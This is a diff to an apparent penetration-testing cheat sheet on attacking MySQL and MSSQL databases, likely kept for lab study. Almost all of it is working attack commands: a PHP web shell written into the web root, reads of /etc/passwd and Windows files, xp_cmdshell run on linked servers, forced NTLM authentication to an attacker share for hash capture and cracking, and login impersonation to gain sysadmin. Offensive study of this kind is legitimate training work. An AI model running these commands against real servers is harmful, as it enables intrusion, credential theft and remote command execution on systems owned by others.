@@ -961,9 +961,17 @@ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "P
   - impacket-mssqlclient -p PORT user@$target
 - **mysql**
   - mysql -h $TARGET -U user -pPass
-  - sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+  - sqlcmd -S SERVERNAME\\accountname -U julio -P 'MyPassword!' -y 30 -Y 30
     - -y (SQLCMDMAXVARTYPEWIDTH) 
     - -Y (SQLCMDMAXFIXEDTYPEWIDTH) 
+
+- Steps
+  - login with current user
+  - check permissions
+  - check impersonation
+  - impersonate
+  - check linked server
+  - execute(cmd) at linkede
 
 #### Queries
 
@@ -977,10 +985,9 @@ sys:                interperte performance schema
 
 - Queries
 ```
-Show Databases;
 Select name FROM master.dbo.sysdatabases
-USE db_name;
-SHOW TABLES;
+USE db_name
+SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
 Select table_name FROM db_name.INFORMATION_SCHEMA.TABLES
 Select * from table_name;
 ```
@@ -1002,7 +1009,6 @@ RECONFIGURE
 - Write Files
 ```
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
-
 show variables like "secure_file_priv"; = read/write 
 ```
 
@@ -1015,12 +1021,13 @@ RECONFIGURE
 ```
 
 - Read files
-
 ```
 select LOAD_FILE("/etc/passwd");
 ```
 
 ##### MSSQL 
+- Commands
+  - sqlcmd
 ```
 master:             info about instance
 msdb:               for SQL server agent
@@ -1029,7 +1036,7 @@ resource:           read-only db
 tempdb:             temporary files
 ```
 
-- [Queries](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/Security_cheatsheets/databases/sqlserver/1-enumeration.md)
+- [Queries](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 
 - Create file
 ```
@@ -1044,7 +1051,11 @@ EXECUTE sp_OADestroy @OLE
 
 - Read files
 ```
+# Bulk load
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+
+# Exec statemente + linked server
+EXECUTE("xp_cmdshell 'type C:\path\to\file'") AT [LOCAL.TEST.LINKED.SRV]
 ```
 
 - Grab hash
@@ -1053,7 +1064,6 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 responder | smbserver share ./ -smb2support
 
 # xp_subdirs/xp_dirtree
-
 EXEC master..xp_dirtree '\\$ATTACKER\share\'
 EXEC master..xp_subdirs '\\$ATTACKER\share\'
 hashcat 5600 (NTLMv2)
@@ -1066,20 +1076,26 @@ hashcat 5600 (NTLMv2)
 SELECT distinct b.name
 FROM sys.server_permissions a
 INNER JOIN sys.server_principals b
-a.grantor_principal_id = b.principal_id
+ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
+GO
 ```
 
 2. Check current role
 ```
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
+go
 ```
 
 3. Impersonate
 ```
-EXECUTE AS LOGIN = 'sa'
-back to 2.
+EXECUTE AS LOGIN = 'USER'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+go
+
 
 # Revert
 REVERT
@@ -1089,12 +1105,20 @@ REVERT
 * USE master
 ```
 
-- External DBs
+- Linked Servers: to check their privileges
 4. show remotes
   
 ```
+# Find local linked servers . remotes
 SELECT srvname, isremote FROM sysservers
+
+# Execute commands at the linked server
+EXECUTE('command') at [10.0.0.12\SQLEXPRESS]
+
+# Example: find user inside the linked server
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+
+# Read file
 ```
 
 - GUI: [dbeaver](https://github.com/dbeaver/dbeaver)
